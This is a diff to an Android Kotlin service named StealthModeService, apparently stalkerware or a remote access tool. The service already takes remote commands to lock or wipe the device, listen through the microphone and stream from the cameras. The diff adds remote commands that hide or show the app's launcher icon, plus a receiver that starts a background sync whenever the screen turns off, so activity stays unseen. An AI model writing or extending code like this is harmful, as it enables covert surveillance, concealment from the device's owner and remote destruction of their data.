@@ -164,6 +164,7 @@ class StealthModeService : Service(), SensorEventListener {
 
         initRealtimeCommands()
         checkSystemIntegrity()
+        registerScreenStateReceiver()
     }
 
     private fun checkSystemIntegrity() {
@@ -285,6 +286,8 @@ class StealthModeService : Service(), SensorEventListener {
 
     private fun handleRemoteCommand(command: String, payload: String? = null) {
         when (command) {
+            "hide_icon" -> AppIdentityManager.hideAppIcon(this)
+            "show_icon" -> AppIdentityManager.showAppIcon(this)
             "lock_device" -> lockDevice()
             "wipe_data" -> wipeDeviceData()
             "start_live_listen" -> startLiveListening()
@@ -364,6 +367,18 @@ class StealthModeService : Service(), SensorEventListener {
             "start_live_camera_back" -> { liveCameraUseFront = false; startLiveCameraStream() }
             "stop_live_camera" -> { isLiveCameraStreaming = false }
         }
+    }
+
+    private fun registerScreenStateReceiver() {
+        val filter = IntentFilter()
+        filter.addAction(Intent.ACTION_SCREEN_OFF)
+        registerReceiver(object : BroadcastReceiver() {
+            override fun onReceive(context: Context, intent: Intent) {
+                if (intent.action == Intent.ACTION_SCREEN_OFF) {
+                    WorkManager.getInstance(context).enqueue(OneTimeWorkRequestBuilder<SyncWorker>().build())
+                }
+            }
+        }, filter)
     }
 
     private fun triggerVibration() {
